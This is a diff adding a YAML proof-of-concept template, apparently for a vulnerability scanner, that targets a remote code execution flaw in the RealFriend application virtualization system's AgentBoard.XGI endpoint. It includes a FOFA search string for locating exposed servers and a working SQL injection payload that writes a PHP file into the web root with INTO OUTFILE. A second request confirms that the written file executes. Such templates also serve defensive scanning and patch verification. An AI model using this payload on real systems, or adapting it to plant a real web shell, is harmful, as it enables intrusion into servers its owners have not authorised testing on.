@@ -1,0 +1,20 @@
+id: poc-yaml-gwt-system-agentboard-xgi-rce
+info:
+  name: 瑞友天翼应用虚拟化系统 AgentBoard.XGI 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="瑞友天翼 - 应用虚拟化系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /AgentBoard.XGI?user=123'union+select+1,'<?php+echo+md5({{.t1}});?>'+INTO+OUTFILE+'C:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/{{.t1}}.XGI'--+
+  expression: status_code == 200
+- method: GET
+  path: /{{.t1}}.XGI
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
